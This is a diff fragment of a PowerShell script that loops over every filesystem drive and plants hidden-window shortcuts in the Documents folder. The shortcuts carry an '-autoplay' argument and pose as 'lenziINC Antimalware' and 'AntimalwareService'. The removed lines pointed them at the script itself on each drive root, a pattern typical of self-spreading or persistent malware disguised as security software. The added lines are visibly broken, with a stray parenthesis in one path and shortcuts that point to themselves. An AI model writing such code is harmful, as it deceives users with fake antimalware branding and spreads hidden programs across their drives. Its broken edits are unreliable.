@@ -5,16 +5,16 @@ foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
         $WshShell = New-Object -ComObject WScript.Shell
         $strDesktop = $WshShell.SpecialFolders("Documents")
         $oShellLink = $WshShell.CreateShortcut("$strDesktop\spork.lnk")
-        $oShellLink.TargetPath = "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
+        $oShellLink.TargetPath = "$($drive.Root):\spork.lnk)"
         $oShellLink.WindowStyle = 0
         $oShellLink.Description = "lenziINC Antimalware"
         $oShellLink.Arguments = "-autoplay"
         $oShellLink.WorkingDirectory = "$($drive.Root):\"
         $oShellLink.Save()
         $WshShell = New-Object -ComObject WScript.Shell
-        $strDesktop = $WshShell.SpecialFolders("Desktop")
+        $strDesktop = $WshShell.SpecialFolders("Documents")
         $oShellLink = $WshShell.CreateShortcut("$strDesktop\lenziscanservice.lnk")
-        $oShellLink.TargetPath = "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
+        $oShellLink.TargetPath = "$($drive.Root):\lenziscanservice.lnk"
         $oShellLink.WindowStyle = 0
         $oShellLink.Description = "AntimalwareService"
         $oShellLink.WorkingDirectory = "$($drive.Root):\"
